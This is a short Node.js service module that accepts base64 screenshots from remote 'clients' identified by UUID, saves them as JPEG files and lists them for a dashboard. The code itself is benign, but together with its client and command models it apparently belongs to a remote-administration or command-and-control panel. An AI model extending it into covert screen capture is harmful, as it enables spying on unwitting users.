'use strict'

const Client = require('../models/Client')
const Command = require('../models/Command')
const commandDao = require('../dao/commandDao')
const clientDao = require('../dao/clientDao')
const clientService = require('./clientService')
const screenshotsDao = require('../dao/screenshotsDao')
const fs = require('fs')


//const { now } = require('sequelize/types/lib/utils')

const screenshotService = {
    addScreenshot: async function ({ uuid, data }) {

        const client = await clientDao.findOneByUuid(uuid)

        // If he doesn't exist
        if (!(client instanceof Client)) {
            return { isAdded: false }
        }
        const basePath = '/app/src'
        const filename = '/static/img/screenshots/' + Date.now() + '.jpeg'

        fs.writeFile(basePath + filename, Buffer.from(data.screenshot, 'base64'), (err) => {
            if (err)
                throw err
        });

        const screenshot = await screenshotsDao.insertOne({
            clientId: client.id,
            filename: filename
        })

        return { isAdded: true }
    },
    findAllByClientId: async function (clientId) {

        const screenshots = await screenshotsDao.findAllByClientId(clientId)
        return screenshots
    },
    getDataDashboard: async function () {

        const screenshots = await screenshotsDao.getDataDashboard()
/*
        for (let s in screenshots) {
            let date = screenshots[s].getDataValue('date')
            date = date.getFullYear() + '-' + (date.getMonth() <= 9 ? '0' : '') + (date.getMonth() + 1) + '-' + date.getDate()
            screenshots[s].setDataValue('date', date)
        }
*/
        return screenshots
    }

}

module.exports = screenshotService